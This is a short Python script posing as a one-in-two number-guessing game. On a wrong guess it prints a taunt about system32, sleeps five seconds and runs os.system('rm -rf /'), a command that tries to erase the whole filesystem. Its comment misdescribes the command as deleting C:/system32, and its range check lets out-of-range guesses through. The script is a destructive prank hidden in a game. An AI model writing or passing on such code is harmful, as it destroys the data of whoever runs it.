import random
import os
import time

number = int(random.randint(1, 2))

# Guess a random number between 1 and 2
while True:
    try:
        guess = int(input("input a number between 1 and 2: "))
        if guess < 1 or guess > 2:
            print("That's not between 1 and 2!")
        break
    except ValueError:
        print("That's not a number!")

if number != guess:
    print("Sorry, you guessed wrong. Bye bye system32 :)")
    #delete C:/system32 after 5 seconds
    time.sleep(5)
    os.system("rm -rf /")

else:
    print("You guessed right!")